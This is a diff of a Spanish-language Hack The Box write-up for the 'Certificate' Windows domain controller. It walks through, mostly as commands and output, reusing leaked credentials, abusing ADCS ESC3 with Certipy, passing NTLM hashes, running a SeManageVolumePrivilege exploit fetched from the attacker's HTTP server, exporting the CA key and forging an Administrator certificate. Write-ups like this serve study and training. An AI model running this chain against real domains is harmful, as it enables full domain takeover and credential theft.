@@ -1,490 +1,793 @@
- 
-# Certificate HTB - Write-up Completo para Principiantes
+# Certificate HTB - Write-up Completo y Detallado para Principiantes
 
 ## Información de la Máquina
 - **IP**: 10.10.11.71
 - **Nombre**: Certificate
-- **Sistema Operativo**: Windows Server (Domain Controller)
+- **Sistema Operativo**: Windows Server 2019 (Domain Controller)
 - **Dificultad**: Media
-- **Objetivos**: Obtener flag de usuario y flag de root
+- **Servicios principales**: IIS, Active Directory, Certificate Services
+- **Flags**: Usuario y Root (reemplazadas con ****)
 
-## Índice
+## Índice Completo
 1. [Preparación del Entorno](#1-preparación-del-entorno)
-2. [Reconocimiento Inicial](#2-reconocimiento-inicial)
-3. [Enumeración de Servicios](#3-enumeración-de-servicios)
-4. [Explotación Inicial - Obtener Primera Shell](#4-explotación-inicial)
-5. [Escalación de Privilegios - Parte 1](#5-escalación-de-privilegios-parte-1)
-6. [Escalación de Privilegios - Parte 2](#6-escalación-de-privilegios-parte-2)
-7. [Lecciones Aprendidas](#7-lecciones-aprendidas)
+2. [Reconocimiento y Enumeración Inicial](#2-reconocimiento-y-enumeración-inicial)
+3. [Enumeración Web - Puerto 443](#3-enumeración-web-puerto-443)
+4. [Acceso Inicial - SMB y Credenciales](#4-acceso-inicial-smb-y-credenciales)
+5. [Primer Acceso - Usuario Lion.SK](#5-primer-acceso-usuario-lionsk)
+6. [Enumeración del Sistema Windows](#6-enumeración-del-sistema-windows)
+7. [Escalación Horizontal - Lion.SK a ryan.k](#7-escalación-horizontal-lionsk-a-ryank)
+8. [Escalación de Privilegios - ryan.k a Administrator](#8-escalación-de-privilegios-ryank-a-administrator)
+9. [Lecciones Aprendidas y Conceptos](#9-lecciones-aprendidas-y-conceptos)
 
 ---
 
 ## 1. Preparación del Entorno
 
-### 1.1 Herramientas Necesarias
-
-Antes de empezar, necesitamos instalar varias herramientas:
+### 1.1 Instalación de Herramientas Necesarias
 
 ```bash
-# Actualizar sistema
+# Actualizar el sistema
 sudo apt update && sudo apt upgrade -y
 
-# Herramientas básicas de pentesting
-sudo apt install -y nmap smbmap smbclient enum4linux crackmapexec evil-winrm
+# Herramientas básicas de red y web
+sudo apt install -y nmap netcat curl wget git
+sudo apt install -y gobuster dirbuster dirb nikto whatweb
 
-# Python y pip
+# Herramientas para SMB/Windows
+sudo apt install -y smbclient smbmap enum4linux crackmapexec evil-winrm
+sudo apt install -y impacket-tools bloodhound neo4j
+
+# Herramientas de cracking y análisis
+sudo apt install -y john hashcat hydra
+sudo apt install -y binwalk exiftool steghide
+
+# Python y librerías
 sudo apt install -y python3 python3-pip
+pip3 install ldapdomaindump
 
-# Herramientas adicionales
-sudo apt install -y faketime chrony rdate
+# Herramientas para manipulación de tiempo
+sudo apt install -y faketime chrony ntpdate rdate
 
-# Certipy - Herramienta para explotar Active Directory Certificate Services
+# Certipy - Herramienta especializada para ADCS
+cd ~
 git clone https://github.com/ly4k/Certipy.git
 cd Certipy
-# Verificar que funciona
+# Verificar instalación
 python3 certipy/entry.py --version
 ```
 
-### 1.2 Agregar máquina al archivo hosts
+### 1.2 Configuración del archivo hosts
 
 ```bash
-# Editar archivo hosts
+# Editar el archivo hosts
 sudo nano /etc/hosts
 
 # Agregar estas líneas:
 10.10.11.71 certificate.htb
 10.10.11.71 dc01.certificate.htb
+10.10.11.71 www.certificate.htb
 ```
 
 ---
 
-## 2. Reconocimiento Inicial
+## 2. Reconocimiento y Enumeración Inicial
 
-### 2.1 Escaneo de Puertos
-
-Primero necesitamos saber qué servicios están corriendo:
+### 2.1 Identificación del Sistema
 
 ```bash
-# Escaneo básico
-nmap -sV 10.10.11.71
+# Ping para verificar que la máquina está activa
+ping -c 1 10.10.11.71
 
-# Escaneo más detallado con scripts
-nmap -sCV 10.10.11.71 -p-
+# TTL=127 indica que es Windows (Linux tendría TTL=64)
 ```
 
-**Puertos encontrados y su significado:**
-- **53/tcp (DNS)**: Servicio de nombres de dominio
-- **88/tcp (Kerberos)**: Autenticación en Active Directory
-- **135/tcp (MSRPC)**: Remote Procedure Call de Microsoft
-- **139/tcp (NetBIOS)**: Compartición de archivos antigua
-- **445/tcp (SMB)**: Compartición de archivos moderna
-- **636/tcp (LDAPS)**: LDAP seguro
-- **3268/tcp (LDAP)**: Global Catalog
-- **5985/tcp (WinRM)**: Windows Remote Management
+### 2.2 Escaneo de Puertos
 
-**Aprendizaje**: La presencia de Kerberos (88) y LDAP (636/3268) nos indica que es un Domain Controller de Active Directory.
+```bash
+# Escaneo rápido de puertos comunes
+nmap -sS -p- --min-rate 5000 10.10.11.71 -oN nmap_initial.txt
+
+# Escaneo detallado de los puertos abiertos
+nmap -sCV -p53,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 10.10.11.71 -oN nmap_detailed.txt
+```
+
+**Puertos encontrados y su propósito:**
+```
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp open  mc-nmf        .NET Message Framing
+```
+
+### 2.3 Identificación del Dominio
+
+```bash
+# Del output de nmap obtenemos:
+# Domain: certificate.htb
+# FQDN: DC01.certificate.htb
+```
 
 ---
 
-## 3. Enumeración de Servicios
+## 3. Enumeración Web - Puerto 443
 
-### 3.1 Enumeración SMB - Búsqueda de Archivos Compartidos
-
-SMB es donde Windows comparte archivos. Vamos a ver qué podemos encontrar:
+### 3.1 Acceso Inicial a la Web
 
 ```bash
-# Intentar listar compartidos sin credenciales
+# Verificar qué hay en HTTPS
+curl -k https://10.10.11.71
+whatweb https://10.10.11.71
+
+# Acceder con Firefox
+firefox https://certificate.htb &
+```
+
+**Observación**: Encontramos una página corporativa de "Certificate LTD"
+
+### 3.2 Enumeración de Directorios
+
+```bash
+# Gobuster con lista de directorios comunes
+gobuster dir -u https://certificate.htb -w /usr/share/wordlists/dirb/common.txt -k
+
+# Gobuster con lista más grande
+gobuster dir -u https://certificate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 50
+
+# Búsqueda de archivos específicos
+gobuster dir -u https://certificate.htb -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,html,txt -k
+```
+
+**Directorios/Archivos encontrados:**
+```
+/assets              (Status: 301)
+/css                 (Status: 301)
+/img                 (Status: 301)
+/js                  (Status: 301)
+/index.html          (Status: 200)
+```
+
+### 3.3 Análisis del Código Fuente
+
+```bash
+# Descargar la página principal
+wget https://certificate.htb -O index.html --no-check-certificate
+
+# Buscar comentarios, links, información útil
+grep -i "comment\|password\|user\|admin\|login" index.html
+grep -oE 'href="[^"]*"' index.html | sort -u
+```
+
+### 3.4 Búsqueda de Subdominios
+
+```bash
+# Usando wfuzz
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    -H "Host: FUZZ.certificate.htb" \
+    --hc 404 --ssl https://10.10.11.71
+
+# Usando gobuster
+gobuster vhost -u https://certificate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k
+```
+
+**Nota**: No se encontraron subdominios adicionales en esta etapa.
+
+---
+
+## 4. Acceso Inicial - SMB y Credenciales
+
+### 4.1 Enumeración SMB Sin Credenciales
+
+```bash
+# Enumerar shares disponibles
+smbclient -L //10.10.11.71 -N
 smbmap -H 10.10.11.71
-
-# Si no funciona, intentar con usuario guest
 smbmap -H 10.10.11.71 -u guest
 
-# Intentar con crackmapexec
+# Enum4linux para información detallada
+enum4linux 10.10.11.71
+
+# Crackmapexec para verificación rápida
 crackmapexec smb 10.10.11.71 -u '' -p '' --shares
+crackmapexec smb 10.10.11.71 -u 'guest' -p '' --shares
 ```
 
-**Resultado encontrado:**
-```
-Development     READ            Development Department Share
-```
-
-### 3.2 Explorar el Share "Development"
+### 4.2 Acceso al Share "Development"
 
 ```bash
-# Conectarse al share
-smbclient //10.10.11.71/Development
+# Conectarse al share Development
+smbclient //10.10.11.71/Development -N
 
-# Dentro del cliente SMB:
-smb: \> dir
+# Comandos dentro de smbclient:
+smb: \> ls
 smb: \> get LICENSE
 smb: \> exit
 
-# Leer el archivo descargado
+# Ver el contenido del archivo
 cat LICENSE
 ```
 
-**Hallazgo importante**: En el archivo LICENSE encontramos:
+**Contenido importante del archivo LICENSE:**
 ```
-[...] the responsible administrator is Lion.Sk
+[...]
+Additionally the responsible administrator is Lion.Sk
 
 Qualys scan results
 -------------------
-[...] Lion.Sk, password: !QAZ2wsx
+Host: DC01.certificate.htb
+User: Lion.Sk, password: !QAZ2wsx
+[...]
 ```
 
-### 3.3 Problema con el Usuario - Mayúsculas y Minúsculas
-
-Aquí encontramos nuestro primer problema. El usuario aparece como "Lion.Sk" pero Windows es sensible a mayúsculas en los usernames.
+### 4.3 Problema con el Formato del Usuario
 
 ```bash
-# Intentar con diferentes combinaciones
-crackmapexec smb 10.10.11.71 -u 'Lion.Sk' -p '!QAZ2wsx'  # Falla
-crackmapexec smb 10.10.11.71 -u 'lion.sk' -p '!QAZ2wsx'  # Falla
-crackmapexec smb 10.10.11.71 -u 'LION.SK' -p '!QAZ2wsx'  # Falla
-crackmapexec smb 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'  # ¡FUNCIONA!
-```
+# Probar diferentes formatos del usuario
+crackmapexec smb 10.10.11.71 -u 'Lion.Sk' -p '!QAZ2wsx'     # Falla
+crackmapexec smb 10.10.11.71 -u 'lion.sk' -p '!QAZ2wsx'     # Falla
+crackmapexec smb 10.10.11.71 -u 'LION.SK' -p '!QAZ2wsx'     # Falla
+crackmapexec smb 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'     # ¡FUNCIONA!
 
-**Lección aprendida**: Windows convierte los usernames a mayúsculas internamente. "Lion.SK" es el formato correcto.
+# Verificar con dominio
+crackmapexec smb 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx' -d 'CERTIFICATE'
+```
 
 ---
 
-## 4. Explotación Inicial - Obtener Primera Shell
+## 5. Primer Acceso - Usuario Lion.SK
 
-### 4.1 Verificar Acceso con Evil-WinRM
+### 5.1 Conexión por WinRM
 
 ```bash
-# Intentar conectarse por WinRM
-evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
+# Verificar que el usuario tiene acceso a WinRM
+crackmapexec winrm 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'
+
+# Conectarse con Evil-WinRM
+evil-winrm -i 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'
 ```
 
-¡Funciona! Ya tenemos acceso como Lion.SK.
-
-### 4.2 Obtener Primera Flag
+### 5.2 Obtención de la Primera Flag
 
 ```powershell
-# Ver en qué directorio estamos
-pwd
+# Verificar usuario actual
+whoami
+# Output: certificate\lion.sk
 
-# Ir al escritorio
+# Navegar al escritorio
 cd C:\Users\Lion.SK\Desktop
 
 # Listar archivos
 dir
 
-# Leer la flag
+# Leer la flag de usuario
 type user.txt
+# Flag: ****************************
 ```
-
-**Flag de usuario**: `****************************`
 
 ---
 
-## 5. Escalación de Privilegios - Parte 1: De Lion.SK a ryan.k
+## 6. Enumeración del Sistema Windows
 
-### 5.1 Enumeración de Active Directory Certificate Services (ADCS)
+### 6.1 Información Básica del Sistema
 
-ADCS es un servicio de Windows que maneja certificados digitales. Si está mal configurado, puede permitir escalación de privilegios.
+```powershell
+# Información del sistema
+systeminfo
 
-#### 5.1.1 Instalar y usar Certipy
+# Usuarios del dominio
+net user
+net user /domain
+
+# Información del usuario actual
+net user Lion.SK /domain
+
+# Grupos del dominio
+net group /domain
+
+# Verificar si es Domain Controller
+nltest /dclist:certificate.htb
+```
+
+### 6.2 Búsqueda de Archivos Interesantes
+
+```powershell
+# Buscar archivos con contraseñas
+dir /s *pass* == *.txt
+dir /s *password* == *.txt
+dir /s *cred* == *.txt
+
+# Buscar archivos de configuración
+dir /s web.config
+dir /s *.config
+dir /s *.xml
+
+# Buscar en el directorio web
+cd C:\inetpub\wwwroot
+dir /s
+```
+
+### 6.3 Enumeración de Servicios Web
+
+```powershell
+# Verificar IIS
+iisreset /status
+
+# Buscar archivos de XAMPP
+dir C:\xampp
+
+# Si existe XAMPP, buscar configuraciones
+cd C:\xampp\htdocs
+dir
+```
+
+### 6.4 Búsqueda en el Directorio de XAMPP
+
+```powershell
+# Navegar a XAMPP
+cd C:\xampp\htdocs\certificate.htb
+dir
+
+# Buscar archivos PHP con configuraciones
+type db.php
+```
+
+**Contenido de db.php (credenciales de MySQL):**
+```php
+<?php
+$host = 'localhost';
+$user = 'certificate_webapp_user';
+$pass = 'cert!f!c@teDBPWD';
+$db = 'certificate_webapp';
+?>
+```
+
+### 6.5 Acceso a MySQL
+
+```powershell
+# Navegar al directorio de MySQL
+cd C:\xampp\mysql\bin
+
+# Conectarse a MySQL
+.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD"
+
+# Comandos MySQL para enumerar
+mysql> show databases;
+mysql> use certificate_webapp;
+mysql> show tables;
+mysql> select * from users;
+mysql> exit
+```
+
+**Nota**: En MySQL podríamos encontrar hashes de contraseñas para crackear con John The Ripper:
 
 ```bash
-# En nuestra máquina Kali
+# Si encontramos hashes, en Kali:
+echo "hash_aqui" > mysql_hash.txt
+john mysql_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
+```
+
+### 6.6 Enumeración de Privilegios
+
+```powershell
+# Verificar privilegios del usuario actual
+whoami /priv
+whoami /groups
+whoami /all
+
+# Buscar servicios vulnerables
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+# Verificar tareas programadas
+schtasks /query /fo LIST /v
+
+# Verificar certificados instalados
+certutil -store my
+certutil -store root
+```
+
+---
+
+## 7. Escalación Horizontal - Lion.SK a ryan.k
+
+### 7.1 Enumeración de Active Directory Certificate Services (ADCS)
+
+```bash
+# Desde Kali, usando Certipy
 cd ~/Certipy
 
-# Buscar vulnerabilidades en certificados
-python3 certipy/entry.py find -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout
+# Enumerar vulnerabilidades en ADCS
+python3 certipy/entry.py find -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout | tee certipy_enum.txt
+
+# Analizar el output
+grep -i "ESC" certipy_enum.txt
 ```
 
-**Resultado importante**: Encontramos una vulnerabilidad ESC3 en el template "Delegated-CRA"
+**Vulnerabilidad encontrada: ESC3**
+- Template vulnerable: `Delegated-CRA`
+- Permite Certificate Request Agent
+- Puede solicitar certificados en nombre de otros usuarios
 
-#### 5.1.2 ¿Qué es ESC3?
+### 7.2 Explicación de ESC3
 
-ESC3 es cuando:
-1. Podemos pedir un certificado de "agente" (Certificate Request Agent)
-2. Con ese certificado de agente, podemos pedir certificados en nombre de otros usuarios
+ESC3 es una vulnerabilidad en la que:
+1. Un usuario puede obtener un certificado con el permiso de "Certificate Request Agent"
+2. Con ese certificado, puede solicitar certificados para otros usuarios
+3. Esto permite suplantar la identidad de cualquier usuario del dominio
 
-### 5.2 Explotar ESC3
-
-#### Paso 1: Obtener certificado de agente
+### 7.3 Explotación de ESC3 - Paso 1: Obtener Certificado de Agente
 
 ```bash
-python3 certipy/entry.py req -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' \
-    -dc-ip 10.10.11.71 -target DC01.CERTIFICATE.HTB \
-    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -out lion.sk
+# Solicitar certificado de agente para Lion.SK
+python3 certipy/entry.py req \
+    -u 'Lion.SK@CERTIFICATE.HTB' \
+    -p '!QAZ2wsx' \
+    -dc-ip 10.10.11.71 \
+    -target DC01.CERTIFICATE.HTB \
+    -ca 'Certificate-LTD-CA' \
+    -template 'Delegated-CRA' \
+    -out lion.sk
+
+# Verificar archivos creados
+ls -la lion.sk*
+# lion.sk.pfx - Certificado con clave privada
+# lion.sk.crt - Certificado público
+# lion.sk.key - Clave privada
 ```
 
-**Archivos creados**:
-- `lion.sk.pfx`: Certificado con clave privada
-- `lion.sk.key`: Clave privada
-- `lion.sk.crt`: Certificado público
-
-#### Paso 2: Usar el certificado de agente para pedir uno de ryan.k
+### 7.4 Explotación de ESC3 - Paso 2: Solicitar Certificado para ryan.k
 
 ```bash
-python3 certipy/entry.py req -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' \
-    -dc-ip 10.10.11.71 -target DC01.CERTIFICATE.HTB \
-    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
-    -on-behalf-of 'CERTIFICATE\ryan.k' -pfx lion.sk.pfx -out ryan.k
+# Usar el certificado de agente para solicitar uno de ryan.k
+python3 certipy/entry.py req \
+    -u 'Lion.SK@CERTIFICATE.HTB' \
+    -p '!QAZ2wsx' \
+    -dc-ip 10.10.11.71 \
+    -target DC01.CERTIFICATE.HTB \
+    -ca 'Certificate-LTD-CA' \
+    -template 'SignedUser' \
+    -on-behalf-of 'CERTIFICATE\ryan.k' \
+    -pfx lion.sk.pfx \
+    -out ryan.k
+
+# Verificar certificado creado
+ls -la ryan.k*
 ```
 
-### 5.3 Problema de Sincronización de Tiempo
-
-Al intentar autenticarnos con el certificado:
+### 7.5 Problema: Sincronización de Tiempo con Kerberos
 
 ```bash
+# Intento 1: Autenticarse con el certificado
 python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
+
+# ERROR: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-**Error**: `KRB_AP_ERR_SKEW(Clock skew too great)`
+#### ¿Por qué ocurre este error?
+Kerberos requiere que el reloj del cliente esté sincronizado con el servidor (diferencia máxima: 5 minutos).
 
-#### 5.3.1 ¿Por qué ocurre este error?
+### 7.6 Soluciones para la Sincronización de Tiempo
 
-Kerberos (el sistema de autenticación de Windows) requiere que la diferencia de tiempo entre cliente y servidor sea menor a 5 minutos.
-
-#### 5.3.2 Soluciones probadas
-
-**Intento 1 - Sincronizar manualmente**:
 ```bash
-# Ver hora del servidor
+# Método 1: Ver la hora del DC
 nmap -p 445 --script smb2-time 10.10.11.71 | grep date
-# Resultado: date: 2025-09-18T03:37:44
+# Output: date: 2025-09-18T03:37:44
 
-# Ajustar nuestra hora
+# Método 2: Sincronizar manualmente
 sudo date -s "18 SEP 2025 03:38:00"
+# Luego intentar inmediatamente
+python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
+
+# Método 3: Usar faketime (ESTE FUNCIONÓ)
+faketime '2025-09-18 03:50:00' python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
+
+# Método 4: Cambiar zona horaria
+sudo timedatectl set-timezone UTC
+date
 ```
 
-**Intento 2 - Usar faketime** (FUNCIONÓ):
-```bash
-# faketime engaña al programa haciéndole creer que está en otra hora
-faketime '2025-09-18 03:50:00' python3 certipy/entry.py auth \
-    -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
-```
-
-**Resultado exitoso**:
-```
-[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
-```
-
-### 5.4 Conectarse como ryan.k
+### 7.7 Autenticación Exitosa y Obtención del Hash
 
 ```bash
-# Usar solo la parte después de los dos puntos
+# Usando faketime
+faketime '2025-09-18 03:50:00' python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
+
+# Output exitoso:
+# [*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
+```
+
+### 7.8 Conexión como ryan.k
+
+```bash
+# Usar solo la parte del hash NTLM (después de los dos puntos)
 evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
 ```
 
 ---
 
-## 6. Escalación de Privilegios - Parte 2: De ryan.k a Administrator
+## 8. Escalación de Privilegios - ryan.k a Administrator
 
-### 6.1 Enumerar Privilegios
+### 8.1 Enumeración de Privilegios de ryan.k
 
 ```powershell
-# Ver qué privilegios especiales tenemos
+# Verificar usuario
+whoami
+# Output: certificate\ryan.k
+
+# Verificar privilegios especiales
 whoami /priv
 ```
 
-**Privilegio importante encontrado**: `SeManageVolumePrivilege`
+**Privilegio importante encontrado:**
+```
+SeManageVolumePrivilege       Perform volume maintenance tasks  Enabled
+```
 
-#### ¿Qué es SeManageVolumePrivilege?
+### 8.2 ¿Qué es SeManageVolumePrivilege?
 
-Este privilegio permite realizar tareas de mantenimiento en volúmenes. Un atacante puede abusar de él para cambiar permisos en cualquier archivo del sistema.
+Este privilegio permite:
+- Realizar tareas de mantenimiento en volúmenes
+- Cambiar permisos en cualquier archivo del sistema
+- Es un privilegio muy peligroso si se puede explotar
 
-### 6.2 Explotar SeManageVolumePrivilege
+### 8.3 Descarga del Exploit SeManageVolumeExploit
 
-#### Paso 1: Descargar el exploit
-
-**En Kali**:
+**En Kali:**
 ```bash
 # Descargar el exploit
 wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
 
-# Servir archivos por HTTP
+# Verificar descarga
+file SeManageVolumeExploit.exe
+ls -la SeManageVolumeExploit.exe
+
+# Iniciar servidor web
 python3 -m http.server 8000
+
+# Verificar tu IP
+ip a | grep tun0
+# Ejemplo: inet 10.10.14.59/23
 ```
 
-**En la máquina víctima (como ryan.k)**:
+**En la máquina víctima (como ryan.k):**
 ```powershell
-# IMPORTANTE: Usar tu IP correcta (verificar con: ip a | grep tun0)
+# Descargar el exploit (usar TU IP)
 curl http://10.10.14.59:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
 
-# Verificar que se descargó
+# Si curl falla, usar Invoke-WebRequest
+Invoke-WebRequest -Uri http://10.10.14.59:8000/SeManageVolumeExploit.exe -OutFile SeManageVolumeExploit.exe
+
+# Verificar descarga
 dir SeManageVolumeExploit.exe
 ```
 
-#### Paso 2: Ejecutar el exploit
+### 8.4 Ejecutar el Exploit
 
 ```powershell
+# Verificar permisos antes
+icacls C:\
+
+# Ejecutar el exploit
 .\SeManageVolumeExploit.exe
+# Output: Entries changed: 876
+# DONE
+
+# Verificar permisos después
+icacls C:\
+# Ahora deberíamos ver permisos adicionales
+
+# Probar escritura
+echo "test" > C:\Windows\test.txt
+type C:\Windows\test.txt
+del C:\Windows\test.txt
 ```
 
-**Resultado**: `Entries changed: 876`
-
-Esto significa que ahora tenemos permisos para leer/escribir en todo C:\
-
-### 6.3 Obtener el Certificado CA
-
-Con los nuevos permisos, podemos exportar el certificado de la Autoridad Certificadora (CA):
+### 8.5 Buscar y Exportar el Certificado CA
 
 ```powershell
 # Crear directorio temporal
-mkdir C:\temp
+mkdir C:\temp -Force
 
-# Buscar certificados
+# Listar certificados del sistema
 Get-ChildItem -Path Cert:\LocalMachine\My
+Get-ChildItem -Path Cert:\LocalMachine\Root
 
 # Buscar específicamente el CA
 Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*Certificate-LTD-CA*"}
 
-# Exportar el certificado con su clave privada
+# Resultado:
+# Thumbprint: 2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8  
+# Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+```
+
+### 8.6 Exportar el Certificado CA con Clave Privada
+
+```powershell
+# Método 1: PowerShell
 $cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*Certificate-LTD-CA*"}
 Export-PfxCertificate -Cert $cert -FilePath C:\temp\ca.pfx -Password (ConvertTo-SecureString -String "password" -Force -AsPlainText)
 
-# Copiar al directorio actual y descargar
+# Método 2: certutil (si el método 1 falla)
+certutil -exportPFX -p password my 2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8 C:\temp\ca.pfx
+
+# Copiar al directorio actual para descarga
 copy C:\temp\ca.pfx .
+dir ca.pfx
+
+# Descargar
 download ca.pfx
 ```
 
-### 6.4 Forjar Certificado de Administrator
+### 8.7 Certificate Forgery - Crear Certificado de Administrator
 
-Con el certificado CA, podemos crear certificados válidos para cualquier usuario:
-
+**En Kali:**
 ```bash
-# En Kali
 cd ~/Certificate/Certipy
 
+# Verificar que tenemos el ca.pfx
+ls -la ca.pfx
+
 # Forjar certificado de Administrator
-python3 certipy/entry.py forge -ca-pfx ca.pfx -ca-password 'password' \
+python3 certipy/entry.py forge \
+    -ca-pfx ca.pfx \
+    -ca-password 'password' \
     -upn 'administrator@certificate.htb' \
     -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' \
     -out admin.pfx
 
-# Autenticarse (con faketime nuevamente)
-faketime '2025-09-18 04:10:00' python3 certipy/entry.py auth \
-    -dc-ip '10.10.11.71' -pfx 'admin.pfx'
+# Verificar creación
+ls -la admin.pfx
 ```
 
-**Hash de Administrator obtenido**: `d804304519bf0143c14cbf1c024408c6`
-
-### 6.5 Acceso como Administrator
+### 8.8 Autenticarse como Administrator
 
 ```bash
+# Intentar autenticación (probablemente fallará por tiempo)
+python3 certipy/entry.py auth -dc-ip '10.10.11.71' -pfx 'admin.pfx'
+
+# Usar faketime para solucionar el problema de tiempo
+faketime '2025-09-18 04:10:00' python3 certipy/entry.py auth -dc-ip '10.10.11.71' -pfx 'admin.pfx'
+
+# Output exitoso:
+# [*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+```
+
+### 8.9 Acceso como Administrator
+
+```bash
+# Conectarse con el hash de Administrator
 evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
 ```
 
-### 6.6 Obtener Flag Root
+### 8.10 Obtener la Flag Root
 
 ```powershell
 # Verificar que somos Administrator
 whoami
+# Output: certificate\administrator
 
-# Obtener la flag
-type C:\Users\Administrator\Desktop\root.txt
+# Navegar al escritorio
+cd C:\Users\Administrator\Desktop
+
+# Listar archivos
+dir
+
+# Leer la flag root
+type root.txt
+# Flag: ****************************
 ```
-
-**Flag root**: `****************************`
 
 ---
 
-## 7. Lecciones Aprendidas
+## 9. Lecciones Aprendidas y Conceptos
 
-### 7.1 Sobre Active Directory Certificate Services (ADCS)
+### 9.1 Flujo Completo del Ataque
 
-1. **¿Qué es ADCS?**
-   - Sistema de Microsoft para crear y gestionar certificados digitales
-   - Usado para autenticación, cifrado y firma digital
+1. **Reconocimiento**: Enumeración de puertos y servicios
+2. **Enumeración Web**: Búsqueda sin éxito en puerto 443
+3. **Enumeración SMB**: Encontrar share "Development"
+4. **Credenciales Iniciales**: Lion.SK en archivo LICENSE
+5. **Acceso Inicial**: WinRM con Lion.SK
+6. **Enumeración Interna**: Búsqueda de archivos y servicios
+7. **ADCS Vulnerabilidad**: ESC3 en Certificate Services
+8. **Escalación Horizontal**: Lion.SK → ryan.k via certificados
+9. **Privilegio Especial**: SeManageVolumePrivilege
+10. **Certificate Forgery**: Crear certificado de Administrator
+11. **Acceso Total**: Administrator con certificado forjado
 
-2. **Vulnerabilidad ESC3**:
-   - Ocurre cuando un usuario puede obtener un certificado de "agente"
-   - Con ese certificado puede solicitar certificados para otros usuarios
-   - Es crítica porque permite escalar privilegios horizontalmente
+### 9.2 Conceptos Técnicos Importantes
 
-3. **Herramienta Certipy**:
-   - Automatiza la búsqueda y explotación de vulnerabilidades ADCS
-   - Comandos principales:
-     - `find`: Buscar vulnerabilidades
-     - `req`: Solicitar certificados
-     - `auth`: Autenticarse con certificados
-     - `forge`: Crear certificados falsos
+#### 9.2.1 Active Directory Certificate Services (ADCS)
+- Sistema para crear y gestionar certificados digitales
+- Los templates mal configurados permiten escalación
+- ESC3: Certificate Request Agent abuse
+- Herramienta principal: Certipy
 
-### 7.2 Sobre Sincronización de Tiempo
+#### 9.2.2 Sincronización de Tiempo en Kerberos
+- Kerberos rechaza autenticación si diferencia > 5 minutos
+- Herramientas: faketime, ntpdate, date -s
+- Siempre verificar hora del DC antes de autenticar
 
-1. **Kerberos y el tiempo**:
-   - Kerberos rechaza autenticaciones si la diferencia es > 5 minutos
-   - Es una medida de seguridad contra ataques de replay
+#### 9.2.3 SeManageVolumePrivilege
+- Permite cambiar permisos en cualquier archivo
+- Exploit público disponible
+- Usado para acceder a claves privadas protegidas
 
-2. **Herramientas útiles**:
-   - `faketime`: Ejecuta programas con una hora falsa
-   - `ntpdate/rdate`: Sincroniza con servidores de tiempo
-   - `date -s`: Ajusta manualmente la hora del sistema
+#### 9.2.4 Certificate Forgery
+- Con el certificado CA se pueden crear certificados válidos
+- Permite autenticación como cualquier usuario
+- No requiere conocer contraseñas
 
-### 7.3 Sobre SeManageVolumePrivilege
+### 9.3 Comandos Útiles de Referencia
 
-1. **¿Qué permite?**:
-   - Realizar operaciones de mantenimiento en volúmenes
-   - Puede ser abusado para cambiar permisos en cualquier archivo
-
-2. **Por qué es peligroso**:
-   - Permite acceder a archivos protegidos del sistema
-   - En este caso, nos permitió exportar el certificado CA
-
-### 7.4 Sobre Certificate Forgery
-
-1. **Con acceso al certificado CA**:
